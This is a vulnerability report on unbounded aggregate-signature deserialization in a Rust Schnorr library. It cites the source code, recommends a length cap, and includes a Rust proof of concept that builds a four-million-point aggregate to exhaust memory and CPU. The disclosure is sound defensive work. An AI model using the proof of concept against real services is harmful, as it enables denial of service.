### Title
Unbounded aggregate-signature deserialization enables attacker-controlled memory and CPU exhaustion - ([File: crypto/schnorr/src/aggregate.rs])

### Summary
`SchnorrAggregate::read` accepts a 32-bit nonce count from untrusted input and reads and stores that many group elements without a protocol- or implementation-defined limit. A successfully parsed aggregate can then cause further unbounded allocation and multiexponentiation work in `SchnorrAggregate::verify`. [1](#0-0) [2](#0-1) 

### Finding Description
The first four serialized bytes are interpreted as a little-endian `u32`, permitting up to 4,294,967,295 nonce commitments. There is no maximum aggregate size, total-input-size check, or relationship to a bounded participant set before the loop pushes each decoded `C::G` into `Rs`. [3](#0-2) 

Each element requires canonical point decoding through `C::read_G`, which reads the complete group encoding and performs canonicalization checks. Thus, an attacker who supplies a large aggregate causes both repeated decoding work and retention of every decoded point. [4](#0-3) [5](#0-4) 

If verification is subsequently invoked, `verify` allocates capacity for `2 * keys_and_challenges.len() + 1` scalar-point pairs, computes an aggregation weight for every entry, and submits the complete vector to `multiexp_vartime`. This makes memory and CPU consumption scale directly with attacker-controlled input size. [2](#0-1) 

### Impact Explanation
An unprivileged party able to submit aggregate-signature bytes can force a process to allocate attacker-controlled amounts of memory and perform proportional point-decoding, scalar-weight, and multiexponentiation work. Repeated submissions can exhaust memory or monopolize CPU, causing service unavailability. [6](#0-5) [7](#0-6) 

### Likelihood Explanation
The issue is reachable through public serialized input whenever an application calls `SchnorrAggregate::read` on attacker-controlled bytes and optionally verifies the resulting aggregate. No signature validity, private key, participant privilege, or protocol threshold is required to trigger the unbounded read. [1](#0-0) 

The declared count alone does not preallocate memory; the attacker must provide enough encoded points to grow the vector. The issue is nevertheless an unbounded, externally controlled allocation and computation path because no aggregate-size or byte-consumption ceiling is enforced. [8](#0-7) 

### Recommendation
Enforce an explicit maximum aggregate length before reading any points, preferably derived from the protocol's maximum signer count and also bounded by an application-level serialized-message limit. Reject counts exceeding that bound before allocation, and consider wrapping the reader with `Read::take` so trailing or unexpectedly large input cannot bypass the intended budget. Apply the same limit before calling `verify`, since verification allocates `2 * n + 1` pairs. [1](#0-0) [7](#0-6) 

### Proof of Concept
The following constructs a syntactically valid aggregate containing four million copies of the canonical compressed generator encoding. `read` retains all decoded points; passing a matching-length `keys_and_challenges` slice to `verify` then allocates millions of additional scalar-point pairs.

```rust
use std::io::Cursor;

use ciphersuite::{
  Ciphersuite,
  group::{ff::Field, Group, GroupEncoding},
};
use frost::curve::Secp256k1;
use schnorr::aggregate::SchnorrAggregate;

const ATTACKER_SIGS: u32 = 4_000_000;

let mut encoded = Vec::new();
encoded.extend_from_slice(&ATTACKER_SIGS.to_le_bytes());

// For Secp256k1 this is a canonical 33-byte compressed point.
let generator_bytes =
  <Secp256k1 as Ciphersuite>::generator().to_bytes();

for _ in 0..ATTACKER_SIGS {
  encoded.extend_from_slice(generator_bytes.as_ref());
}

// Append a canonical scalar encoding.
encoded.extend_from_slice(
  <Secp256k1 as Ciphersuite>::F::ONE.to_repr().as_ref(),
);

let aggregate =
  SchnorrAggregate::<Secp256k1>::read(&mut Cursor::new(encoded))
    .expect("attacker-controlled aggregate decoded");

assert_eq!(aggregate.Rs().len(), ATTACKER_SIGS as usize);

// If the verifier path is reached, this creates 8,000,001 scalar-point
// pairs and performs a multiexponentiation over them.
let keys_and_challenges = vec![
  (
    <Secp256k1 as Ciphersuite>::generator(),
    <Secp256k1 as Ciphersuite>::F::ONE,
  );
  ATTACKER_SIGS as usize
];
let _ = aggregate.verify(b"example-domain", &keys_and_challenges);
```

The vulnerable count consumption is at `crypto/schnorr/src/aggregate.rs:78-85`, while the secondary allocation and multiexponentiation occur at `crypto/schnorr/src/aggregate.rs:138-145`. [8](#0-7) [7](#0-6)

### Citations

**File:** crypto/schnorr/src/aggregate.rs (L76-87)
```rust
  /// Read a SchnorrAggregate from something implementing Read.
  pub fn read<R: Read>(reader: &mut R) -> io::Result<Self> {
    let mut len = [0; 4];
    reader.read_exact(&mut len)?;

    #[allow(non_snake_case)]
    let mut Rs = vec![];
    for _ in 0 .. u32::from_le_bytes(len) {
      Rs.push(C::read_G(reader)?);
    }

    Ok(SchnorrAggregate { Rs, s: C::read_F(reader)? })
```

**File:** crypto/schnorr/src/aggregate.rs (L127-145)
```rust
  pub fn verify(&self, dst: &'static [u8], keys_and_challenges: &[(C::G, C::F)]) -> bool {
    if self.Rs.len() != keys_and_challenges.len() {
      return false;
    }

    let mut digest = DigestTranscript::<C::H>::new(dst);
    digest.domain_separate(b"signatures");
    for (_, challenge) in keys_and_challenges {
      digest.append_message(b"challenge", challenge.to_repr());
    }

    let mut pairs = Vec::with_capacity((2 * keys_and_challenges.len()) + 1);
    for (i, (key, challenge)) in keys_and_challenges.iter().enumerate() {
      let z = weight(&mut digest);
      pairs.push((z, self.Rs[i]));
      pairs.push((z * challenge, *key));
    }
    pairs.push((-self.s, C::generator()));
    multiexp_vartime(&pairs).is_identity().into()
```

**File:** crypto/schnorr/src/lib.rs (L50-53)
```rust
  /// Read a SchnorrSignature from something implementing Read.
  pub fn read<R: Read>(reader: &mut R) -> io::Result<Self> {
    Ok(SchnorrSignature { R: C::read_G(reader)?, s: C::read_F(reader)? })
  }
```

**File:** crypto/ciphersuite/src/lib.rs (L91-100)
```rust
  fn read_G<R: Read>(reader: &mut R) -> io::Result<Self::G> {
    let mut encoding = <Self::G as GroupEncoding>::Repr::default();
    reader.read_exact(encoding.as_mut())?;

    let point = Option::<Self::G>::from(Self::G::from_bytes(&encoding))
      .ok_or_else(|| io::Error::other("invalid point"))?;
    if point.to_bytes().as_ref() != encoding.as_ref() {
      Err(io::Error::other("non-canonical point"))?;
    }
    Ok(point)
```
